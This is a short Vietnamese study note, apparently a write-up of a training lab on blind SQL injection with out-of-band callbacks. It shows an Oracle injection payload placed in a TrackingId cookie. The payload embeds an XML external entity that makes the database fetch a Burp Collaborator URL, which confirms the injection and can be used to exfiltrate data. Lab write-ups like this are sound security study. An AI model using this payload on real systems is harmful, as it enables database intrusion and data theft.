![[lab-blind-oast.png]]
Lab blind OAST, chọc cho DB gọi DNS về Collaborator để confirm.

> [!NOTE] phân tích đề
> - query chạy async, không boolean, không time.
> - chỉ còn đường gọi ra ngoài.
> -sau khi quan sát lab này, mình thấy boolean lẫn time đều không phân biệt được mà DB thì ra internet được, nên mình nhét payload gọi về Collaborator để vừa confirm inject vừa exfil.
> - liên quan [[lys thuyet sql injection]] và [[SQL cheet sheet]].

### hướng giải
- [ ] mở Burp Collaborator, copy subdomain.
- [ ] intercept request có TrackingId.
- [ ] chèn payload DNS lookup.
- [ ] poll Collaborator xem có query không.

### giải
request gốc:
```
GET / HTTP/1.1
Cookie: TrackingId=abc123; session=xxx
```
-> response bình thường, không hint.

payload Oracle (lab này dùng Oracle):
```
Cookie: TrackingId=abc123'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://xyz123.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
```
-> DB parse XML.
-> fetch URL ngoài.
=> Collaborator nhận DNS lookup.
-> lab báo solved.

check Collaborator:
```
Poll now -> thấy DNS interaction từ xyz123
```
-> confirm OAST thành công.

> [!NOTE] bài học
> - async thì boolean / time thua.
> - OAST là gọi ra ngoài rồi hóng.
> - sau bài này qua [[Lab-SQLi filter bypass]].
